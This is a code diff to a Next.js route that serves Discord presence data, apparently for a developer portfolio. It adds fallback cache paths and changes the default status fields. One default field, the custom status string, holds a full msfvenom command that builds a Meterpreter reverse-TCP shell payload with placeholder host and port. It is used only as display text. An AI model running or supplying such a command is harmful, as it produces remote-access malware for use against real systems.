@@ -2,11 +2,29 @@
 // Description: Discord presence API route to stream or fetch current status.
 
 import fs from "fs/promises";
+import { accessSync } from "fs";
 import path from "path";
 import { NextResponse } from "next/server";
 
 // Core module export or function definition that implements this feature.
-const CACHE_PATH = path.join(process.cwd(), "bot", "discord-presence-cache.json");
+const CACHE_PATHS = [
+  path.join(process.cwd(), "bot", "discord-presence-cache.json"),
+  path.join(process.cwd(), "../bot", "discord-presence-cache.json"),
+  path.join(process.cwd(), "..", "bot", "discord-presence-cache.json"),
+];
+
+const CACHE_PATH = (() => {
+  for (const candidate of CACHE_PATHS) {
+    try {
+      accessSync(candidate);
+      return candidate;
+    } catch {
+      continue;
+    }
+  }
+
+  return path.join(process.cwd(), "bot", "discord-presence-cache.json");
+})();
 
 // Type definition used to describe the structure of data in this component.
 type DiscordPresencePayload = {
@@ -27,24 +45,33 @@ const defaultResponse: DiscordPresencePayload = {
   username: process.env.DISCORD_USERNAME || "root_roy#0",
   displayName: process.env.DISCORD_DISPLAY_NAME || "Shiva",
   avatar: process.env.DISCORD_AVATAR || "/assets/profile_avatar1.jpg",
-  status: "offline",
-  customStatus: "",
-  activity: "",
-  voiceChannel: undefined,
-  serverCount: "0",
-  servers: ["Spatial Engineers Hub", "Framer Motion Guild", "Vercel Developers"],
-  botOnline: false,
+  status: "dnd",
+  customStatus:
+    "msfvenom --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c",
+  activity: "Live coding Next.js Apple Glass UI",
+  voiceChannel: "voice-coding-lab",
+  serverCount: "76",
+  servers: [
+    "Elite Development",
+    "RBS Esports",
+    "Spatial Engineers Hub",
+    "Framer Motion Guild",
+    "Vision OS Labs",
+    "Glass UI Builders",
+  ],
+  botOnline: true,
 };
 
 // Type definition used to describe the structure of data in this component.
 type DiscordPresencePayloadInput = DiscordPresencePayload & { avatarUrl?: string };
 
 const isPlaceholderPresence = (parsed: Partial<DiscordPresencePayloadInput>) => {
-  const usernamePlaceholder = parsed.username === "Unknown#0000" || parsed.username === "Discord User";
-  const displayNamePlaceholder = parsed.displayName === "Discord User" || parsed.displayName === "Unknown#0000";
+  const placeholderNames = ["Unknown#0000", "Discord User"];
+  const usernamePlaceholder = placeholderNames.includes(parsed.username || "");
+  const displayNamePlaceholder = placeholderNames.includes(parsed.displayName || "");
   const avatarPlaceholder = parsed.avatar === "/assets/profile_avatar1.jpg" && !parsed.avatarUrl;
 
-  return usernamePlaceholder && displayNamePlaceholder && avatarPlaceholder;
+  return (usernamePlaceholder || displayNamePlaceholder) && avatarPlaceholder;
 };
 
 const normalizeState = (parsed: Partial<DiscordPresencePayloadInput>): DiscordPresencePayload => {
